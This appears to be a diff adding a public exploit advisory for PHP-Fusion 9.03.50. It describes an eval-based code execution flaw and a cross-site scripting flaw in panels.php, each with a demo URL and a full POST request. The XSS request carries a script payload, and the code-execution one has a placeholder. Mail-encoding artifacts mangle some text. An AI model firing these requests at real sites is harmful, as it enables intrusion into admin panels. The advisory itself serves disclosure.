@@ -1,0 +1,60 @@
+# Exploit Title: PHP-Fusion 9.03.50 - 'panels.php' Multiple vulnerability
+# Google Dork: N/A=20
+# Date: 2020-04-01
+# Exploit Author: Unkn0wn
+# Vendor Homepage: https://www.php-fusion.co.uk
+# Software Link: https://www.php-fusion.co.uk/php_fusion_9_downloads.php
+# Version: 9.03.50
+# Tested on: Ubuntu
+# CVE : N/A
+---------------------------------------------------------
+Code Execution:
+This vulnerabilty in "add_panel_form()" function.
+in line 527 we can see "eval" tag:
+*
+eval("?>".stripslashes($_POST['panel_content'])."<?php ");
+*
+and to this funcation in line 528 - 530 return us payload:
+*
+$eval =3D ob_get_contents();
+                    ob_end_clean();
+                    echo $eval;
+=09=09=09=09=09
+*
+Demo:
+http://localhost/PHP-Fusion/files/administration/panels.php?aid=3Dae28e84e2=
+2e900fb&section=3Dpanelform&action=3Dedit&panel_id=3D4
+
+POST DATA:
+fusion_token=3D1-1585668386-30dc735031f57e89268287bb176e78b092e156dd32a583c=
+f191c7dd30c2d99e9&form_id=3Dpanel_form&fusion_PmbaJ2=3D&panel_id=3D4&panel_=
+name=3DWelcome Message&panel_filename=3Dnone&panel_side=3D2&panel_restricti=
+on=3D2&panel_url_list=3D&panel_display=3D0&panel_content-insertimage=3D&pan=
+el_content=3D;"Code Execution Payload"&panel_access=3D0&panel_languages[]=
+=3DEnglish&panel_save=3DPreview Panel
+----------------------------
+
+Cross site-scripting:
+In line 532  with POST DATA prin"t panel_content:
+"
+echo "<p>".nl2br(parse_textarea($_POST['panel_content'], FALSE, FALSE))."</=
+p>\n";
+"
+
+Demo:
+http://localhost/PHP-Fusion/files/administration/panels.php?aid=3Dae28e84e2=
+2e900fb&section=3Dpanelform&action=3Dedit&panel_id=3D4
+
+POST DATA:
+fusion_token=3D1-1585668386-30dc735031f57e89268287bb176e78b092e156dd32a583c=
+f191c7dd30c2d99e9&form_id=3Dpanel_form&fusion_PmbaJ2=3D&panel_id=3D4&panel_=
+name=3DWelcome Message&panel_filename=3Dnone&panel_side=3D2&panel_restricti=
+on=3D2&panel_url_list=3D&panel_display=3D0&panel_content-insertimage=3D&pan=
+el_content=3D;"<script>alert('Unkn0wn')</script>"&panel_access=3D0&panel_la=
+nguages[]=3DEnglish&panel_save=3DPreview Panel
+
+----------------------------------------------------------
+# Contact : 0x9a@tuta.io
+# Visit: https://t.me/l314XK205E
+# @ 2010 - 2020
+# Underground Researcher
